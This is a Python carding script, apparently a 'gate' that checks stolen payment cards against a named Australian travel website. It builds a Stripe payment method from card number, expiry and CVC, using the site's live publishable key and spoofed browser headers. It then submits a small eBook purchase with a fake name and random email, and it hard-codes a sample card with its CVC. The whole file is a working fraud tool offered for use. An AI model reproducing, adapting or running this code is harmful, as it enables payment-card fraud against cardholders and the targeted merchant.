# gatet.py - Travellingwell.com.au version
import requests
import random
import json
from user_agent import generate_user_agent

def Tele(ccx):
    try:
        ccx = ccx.strip()
        n = ccx.split("|")[0]
        mm = ccx.split("|")[1]
        yy = ccx.split("|")[2]
        cvc = ccx.split("|")[3]
        
        if "20" in yy:
            yy = yy.split("20")[1]
        
        user = generate_user_agent()
        
        random_num = random.randint(20, 999)
        random_email = f"user{random.randint(1,9999)}@gmail.com"
        
        # ============ FIRST REQUEST: Create Payment Method ============
        headers1 = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': user,
        }
        
        data1 = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=780ea92f-ee68-43db-9225-72beb68142058722f5&muid=62576e70-cf26-4aab-9642-f57ba8bc8c0899d9bf&sid=77032959-d61f-4ef9-a8c4-3bc3dfa497f2df9220&pasted_fields=number&payment_user_agent=stripe.js%2F81274c9437%3B+stripe-js-v3%2F81274c9437%3B+card-element&referrer=https%3A%2F%2Fwww.travellingwell.com.au&time_on_page=77372&client_attribution_metadata[client_session_id]=93c3ba1b-ba92-4441-bfc8-6e3489e0c773&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&client_attribution_metadata[wallet_config_id]=55cf4ee2-665a-4e5f-93a9-5142b74b94dc&key=pk_live_51SIkqdLknc83KPzcJBUu6tRJ06FLSDeUmBoRiGsJJW97R5RMIeFIOb4sYzUFjAahpd0czNIVCOc3Zs1202aF5HcU00gSnlcWBf'
        
        r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers1, data=data1)
        
        if r1.status_code != 200:
            return {"error": f"Stripe API error: {r1.status_code}", "response": r1.text}
        
        pm = r1.json()['id']
        
        # ============ SECOND REQUEST: Submit Payment ============
        headers2 = {
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Origin': 'https://www.travellingwell.com.au',
            'Referer': 'https://www.travellingwell.com.au/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': user,
            'X-Requested-With': 'XMLHttpRequest',
            'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
        }
        
        # Cookies from curl
        cookies = {
            '_ga': 'GA1.1.1363319179.1780854480',
            '__stripe_mid': '62576e70-cf26-4aab-9642-f57ba8bc8c0899d9bf',
            '__stripe_sid': '77032959-d61f-4ef9-a8c4-3bc3dfa497f2df9220',
        }
        
        params = {
            't': '1780854564052',
        }
        
        data2 = {
            'data': f'item_3__fluent_sf=&__fluent_form_embded_post_id=15&_fluentform_3_fluentformnonce=a43524378e&_wp_http_referer=%2F&names%5Bfirst_name%5D=Fyrr&names%5Blast_name%5D=Ddttr&email={random_email}&payment_input=Travelling%20Well%20eBook%20-%20EPUB%20(%246.95)&item-quantity=1&payment_method=stripe&__stripe_payment_method_id={pm}',
            'action': 'fluentform_submit',
            'form_id': '3',
        }
        
        r2 = requests.post('https://www.travellingwell.com.au/wp-admin/admin-ajax.php', params=params, headers=headers2, cookies=cookies, data=data2)
        
        return r2.json()
    
    except Exception as e:
        return {"error": str(e)}

# ============ MAIN EXECUTION ============
if __name__ == "__main__":
    # Format: card_number|month|year|cvc
    card_data = "5362262069378401|09|27|690"
    result = Tele(card_data)
    print(json.dumps(result, indent=2))
